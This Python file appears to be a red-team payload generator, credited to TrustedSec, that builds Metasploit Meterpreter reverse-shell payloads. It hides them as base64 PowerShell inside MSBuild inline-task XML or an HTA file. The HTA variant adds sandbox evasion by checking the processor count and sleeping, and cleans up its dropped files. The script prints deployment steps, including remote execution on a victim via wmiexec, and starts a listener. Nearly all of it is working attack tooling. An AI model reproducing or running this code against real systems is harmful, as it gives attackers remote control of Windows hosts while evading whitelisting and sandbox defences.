#!/usr/bin/env python

# Written by Larry Spohn (@Spoonman1091)
# Payload written by Ben Mauch (@Ben0xA) aka dirty_ben
# TrustedSec, LLC
# https://www.trustedsec.com

from __future__ import print_function
import os
import sys
import netifaces as nic
import pexpect
import base64

class bcolors:
  BLUE = '\033[94m'
  GREEN = '\033[92m'
  WARNING = '\033[93m'
  WHITE = '\033[97m'
  ERROR = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'

listener_ip = "127.0.0.1"

# Configure for auto detection of local IP Address
local_interface = "ens33"

try:
    raw_input          # Python 2
except NameError:
    raw_input = input  # Python 3

# Enumerate the local IP assigned to "iface"
def get_local_ip(iface):
  try:
    nic.ifaddresses(iface)
    local_ip = nic.ifaddresses(iface)[2][0]['addr']
    return local_ip
  except:
    pass

def generate_msfvenom_payload(msf_payload):
  global listener_ip

  if (listener_ip == "127.0.0.1"):
    local_ip = get_local_ip(local_interface)
    listener_ip = raw_input("Enter Your Local IP Address (%s): " % local_ip) or local_ip

  # Get listern port from user
  msf_port = raw_input("Enter the listener port (443): ") or 443

  # Generate PSH payload
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating PSH Payload...")
  output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x86 --platform win -f psh -o msf_payload.ps1" % (msf_payload,listener_ip,msf_port))

  # Generate resource script
  print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating MSF Resource Script...")
  msf_resource_file = open("msbuild_nps.rc", "a")
  payload_listener = "\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j -z" % (msf_payload, listener_ip, msf_port)
  msf_resource_file.write(payload_listener)
  msf_resource_file.close()

def encode_pshpayload(payload_file):
  global psh_payload

  psh_file = open(payload_file, "r")
  psh_payload = psh_file.read() + "for (;;){\n  Start-sleep 60\n}"
  psh_payload = base64.b64encode(psh_payload.encode('utf-8'))
  psh_file.close()
  return psh_payload

def generate_msbuild_nps_msf_payload():
  global psh_payload
  global listener_ip

  # Delete old resource script
  if os.path.exists("msbuild_nps.rc"):
    os.remove("msbuild_nps.rc")

  # Initilize new resource script
  msf_resource_file = open("msbuild_nps.rc", "a")
  msf_resource_file.write("use multi/handler")
  msf_resource_file.close()

  # Display options to the user
  print("\nPayload Selection:")
  print("\n\t(1)\twindows/meterpreter/reverse_tcp")
  print("\t(2)\twindows/meterpreter/reverse_http")
  print("\t(3)\twindows/meterpreter/reverse_https")
  print("\t(4)\tCustom PS1 Payload")

  options = {1: "windows/meterpreter/reverse_tcp",
             2: "windows/meterpreter/reverse_http",
             3: "windows/meterpreter/reverse_https",
             4: "custom_ps1_payload"
  }

  # Generate payload
  try:
    msf_payload = int(input("\nSelect payload: "))
    if (options.get(msf_payload) == "custom_ps1_payload"):
      custom_ps1 = raw_input("Enter the location of your custom PS1 file: ")
      encode_pshpayload(custom_ps1)
    else:
      generate_msfvenom_payload(options.get(msf_payload))
      encode_pshpayload("msf_payload.ps1")

  except KeyError:
    pass


  # Create msbuild_nps.xml
  msbuild_nps_file = open("msbuild_nps.xml", "w")
  msbuild_nps_file.write("""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe nps.xml -->
  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
  <!-- License: BSD 3-Clause -->
  <Target Name="npscsharp">
   <nps />
  </Target>
  <UsingTask
    TaskName="nps"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

          using System;
      using System.Collections.ObjectModel;
      using System.Management.Automation;
      using System.Management.Automation.Runspaces;
      using Microsoft.Build.Framework;
      using Microsoft.Build.Utilities;

      public class nps : Task, ITask
        {
            public override bool Execute()
            {
              string cmd = "%s";

                PowerShell ps = PowerShell.Create();
                ps.AddScript(Base64Decode(cmd));

                Collection<PSObject> output = null;
                try
                {
                    output = ps.Invoke();
                }
                catch(Exception e)
                {
                    Console.WriteLine("Error while executing the script.\\r\\n" + e.Message.ToString());
                }
                if (output != null)
                {
                    foreach (PSObject rtnItem in output)
                    {
                        Console.WriteLine(rtnItem.ToString());
                    }
                }
                return true;
            }

            public static string Base64Encode(string text) {
           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
        }

        public static string Base64Decode(string encodedtext) {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
        }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>""" % psh_payload)

  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Metasploit resource script written to msbuild_nps.rc")  
  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Payload written to msbuild_nps.xml")
  print("\n1. Run \"" + bcolors.WHITE + "msfconsole -r msbuild_nps.rc" + bcolors.ENDC + "\" to start listener.")
  print("2. Choose a Deployment Option (a or b): - See README.md for more information.")
  print("  a. Local File Deployment:\n" + bcolors.WHITE + "    - %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe <folder_path_here>\\msbuild_nps.xml" + bcolors.ENDC)
  print("  b. Remote File Deployment:\n" + bcolors.WHITE + "    - wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \\\\<attackerip>\\<share>\\msbuild_nps.xml" + bcolors.ENDC)
  print("3. Hack the Planet!!")

  sys.exit(0)

def generate_msbuild_nps_msf_hta_payload():
  global psh_payload
  global listener_ip

  psh_payload = ""
  psh_payloads = ""
  payload_count = 1


  # Delete old resource script
  if os.path.exists("msbuild_nps.rc"):
    os.remove("msbuild_nps.rc")

  # Initilize new resource script
  msf_resource_file = open("msbuild_nps.rc", "a")
  msf_resource_file.write("use multi/handler")
  msf_resource_file.close()

  while True:
    # Display options to the user
    print("\nPayload Selection:")
    print("\n\t(1)\twindows/meterpreter/reverse_tcp")
    print("\t(2)\twindows/meterpreter/reverse_http")
    print("\t(3)\twindows/meterpreter/reverse_https")
    print("\t(4)\tCustom PS1 Payload")
    print("\t(99)\tFinished")

    options = {1: "windows/meterpreter/reverse_tcp",
               2: "windows/meterpreter/reverse_http",
               3: "windows/meterpreter/reverse_https",
               4: "custom_ps1_payload",
               99: "finished"
    }

    # Generate payloads
    try:
      msf_payload = int(input("\nSelect multiple payloads. Enter 99 when finished: "))
      if (options.get(msf_payload) == "finished"):
        break
      elif (options.get(msf_payload) == "custom_ps1_payload"):
        custom_ps1 = raw_input("Enter the location of your custom PS1 file: ")
        encode_pshpayload(custom_ps1)
      else:
        generate_msfvenom_payload(options.get(msf_payload))
        encode_pshpayload("msf_payload.ps1")
        os.remove("msf_payload.ps1")

      # Generate payload vbs array string
      if (payload_count == 1):
        psh_payloads = "\"" + psh_payload + "\""
      else:
        psh_payloads += ", _\n\t\"" + psh_payload + "\""
      payload_count += 1

    except KeyError:
      pass

  # Create msbuild_nps.xml
  msbuild_nps_file = open("msbuild_nps.hta", "w")
  msbuild_nps_file.write("""<script language=vbscript>
  On Error Resume Next

  Set objFSO = CreateObject("Scripting.FileSystemObject")
  Set objShell = CreateObject("WScript.Shell")
  objTemp = objShell.ExpandEnvironmentStrings("%%TEMP%%")
  objWindir = objShell.ExpandEnvironmentStrings("%%windir%%")
  Set objWMIService = GetObject("winmgmts:\\\\.\\root\CIMV2")
  arrUnicorns = Array(%s)

  ' Get logical processor count
  Set colComputerSystem = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem")
  For Each objComputerSystem In colComputerSystem
    objProcessorCount = objComputerSystem.NumberofLogicalProcessors
  Next

  ' Only run if system has more than 1 processor
  ' https://www.trustedsec.com/may-2015/bypassing-virtualization-and-sandbox-technologies/
  If objProcessorCount > 1 Then
    ' Sleep 60 seconds
    ' https://www.sans.org/reading-room/whitepapers/malicious/sleeping-sandbox-35797
    objShell.Run "%%COMSPEC%% /c ping -n 60 127.0.0.1>nul", 0, 1

    For Each objUnicorn in arrUnicorns
      x = x + 1

      ' Create MSBuild XML File
      CreateMSBuildXML objUnicorn, x

      ' Execute resource(x).xml using msbuild.exe and nps
      objShell.Run objWindir & "\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe %%TEMP%%\\resource" & x & ".xml", 0
    Next

    ' Cleanup
    For y = 1 To x
      Do While objFSO.FileExists(objTemp & "\\resource" & y & ".xml")
        objShell.Run "%%COMSPEC%% /c ping -n 10 127.0.0.1>nul", 0, 1
        objFSO.DeleteFile(objTemp & "\\resource" & y & ".xml")
      Loop
    Next
  End If

  window.close()

  ' Creates XML configuration files in the %%TEMP%% directory
  Function CreateMSBuildXML(objUnicorn, x)
    msbuildXML = "<Project ToolsVersion=" & CHR(34) & "4.0" & CHR(34) & " xmlns=" & CHR(34) & "http://schemas.microsoft.com/developer/msbuild/2003" & CHR(34) & ">" & vbCrLf &_
    "  <!-- This inline task executes c# code. -->" & vbCrLf &_
    "  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe nps.xml -->" & vbCrLf &_
    "  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->" & vbCrLf &_
    "  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->" & vbCrLf &_
    "  <!-- License: BSD 3-Clause -->" & vbCrLf &_
    "  <Target Name=" & CHR(34) & "npscsharp" & CHR(34) & ">" & vbCrLf &_
    "   <nps />" & vbCrLf &_
    "  </Target>" & vbCrLf &_
    "  <UsingTask" & vbCrLf &_
    "    TaskName=" & CHR(34) & "nps" & CHR(34) & "" & vbCrLf &_
    "    TaskFactory=" & CHR(34) & "CodeTaskFactory" & CHR(34) & "" & vbCrLf &_
    "    AssemblyFile=" & CHR(34) & "C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" & CHR(34) & " >" & vbCrLf &_
    "  <Task>" & vbCrLf &_
    "    <Reference Include=" & CHR(34) & "System.Management.Automation" & CHR(34) & " />" & vbCrLf &_
    "      <Code Type=" & CHR(34) & "Class" & CHR(34) & " Language=" & CHR(34) & "cs" & CHR(34) & ">" & vbCrLf &_
    "        <![CDATA[" & vbCrLf &_
    "" & vbCrLf &_
    "          using System;" & vbCrLf &_
    "      using System.Collections.ObjectModel;" & vbCrLf &_
    "      using System.Management.Automation;" & vbCrLf &_
    "      using System.Management.Automation.Runspaces;" & vbCrLf &_
    "      using Microsoft.Build.Framework;" & vbCrLf &_
    "      using Microsoft.Build.Utilities;" & vbCrLf &_
    "" & vbCrLf &_
    "      public class nps : Task, ITask" & vbCrLf &_
    "        {" & vbCrLf &_
    "            public override bool Execute()" & vbCrLf &_
    "            {" & vbCrLf &_
    "              string cmd = " & CHR(34) & objUnicorn & CHR(34) & ";" & vbCrLf &_
    "              " & vbCrLf &_
    "                PowerShell ps = PowerShell.Create();" & vbCrLf &_
    "                ps.AddScript(Base64Decode(cmd));" & vbCrLf &_
    "" & vbCrLf &_
    "                Collection<PSObject> output = null;" & vbCrLf &_
    "                try" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    output = ps.Invoke();" & vbCrLf &_
    "                }" & vbCrLf &_
    "                catch(Exception e)" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    Console.WriteLine(" & CHR(34) & "Error while executing the script.\\r\\n" & CHR(34) & " + e.Message.ToString());" & vbCrLf &_
    "                }" & vbCrLf &_
    "                if (output != null)" & vbCrLf &_
    "                {" & vbCrLf &_
    "                    foreach (PSObject rtnItem in output)" & vbCrLf &_
    "                    {" & vbCrLf &_
    "                        Console.WriteLine(rtnItem.ToString());" & vbCrLf &_
    "                    }" & vbCrLf &_
    "                }" & vbCrLf &_
    "                return true;" & vbCrLf &_
    "            }" & vbCrLf &_
    "" & vbCrLf &_
    "            public static string Base64Encode(string text) {" & vbCrLf &_
    "           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));" & vbCrLf &_
    "        }" & vbCrLf &_
    "" & vbCrLf &_
    "        public static string Base64Decode(string encodedtext) {" & vbCrLf &_
    "            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));" & vbCrLf &_
    "        }" & vbCrLf &_
    "        }" & vbCrLf &_
    "        ]]>" & vbCrLf &_
    "      </Code>" & vbCrLf &_
    "    </Task>" & vbCrLf &_
    "  </UsingTask>" & vbCrLf &_
    "</Project>"
    Set objFile = objFSO.CreateTextFile(objTemp & "\\resource" & x & ".xml", True)
    objFile.WriteLine(msbuildXML)
    objFile.Close
  End Function
</script>""" % psh_payloads)

  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Metasploit resource script written to msbuild_nps.rc")  
  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Payload written to msbuild_nps.hta")
  print("\n1. Run \"" + bcolors.WHITE + "msfconsole -r msbuild_nps.rc" + bcolors.ENDC + "\" to start listener.")
  print("2. Deploy hta file to web server and navigate from the victim machine.")
  print("3. Hack the Planet!!")

  sys.exit()

# Exit Program
def quit():
  sys.exit(0)


# Main guts
def main():
  print("""
                                     (            (
                              ) (    )\        )  )\ )
  (    `  )  (       `  )  ( /( )\ )((_)(   ( /( (()/(
  )\ ) /(/(  )\      /(/(  )(_)|()/( _  )\  )(_)) ((_)
 _(_/(((_)_\((_)    ((_)_\((_)_ )(_)) |((_)((_)_  _| |
| ' \)) '_ \|_-<    | '_ \) _` | || | / _ \/ _` / _` |
|_||_|| .__//__/____| .__/\__,_|\_, |_\___/\__,_\__,_|
      |_|     |_____|_|         |__/

                       v1.03
""")

  while(1):
    # Display options to the user
    print("\n\t(1)\tGenerate msbuild/nps/msf payload")
    print("\t(2)\tGenerate msbuild/nps/msf HTA payload")
    print("\t(99)\tQuit")

    options = {1: generate_msbuild_nps_msf_payload,
               2: generate_msbuild_nps_msf_hta_payload,
               99: quit,
    }
    try:
      task = int(input("\nSelect a task: "))
      options[task]()
    except KeyError:
      pass


# Standard boilerplate to call the main() function
if __name__ == '__main__':
  main()
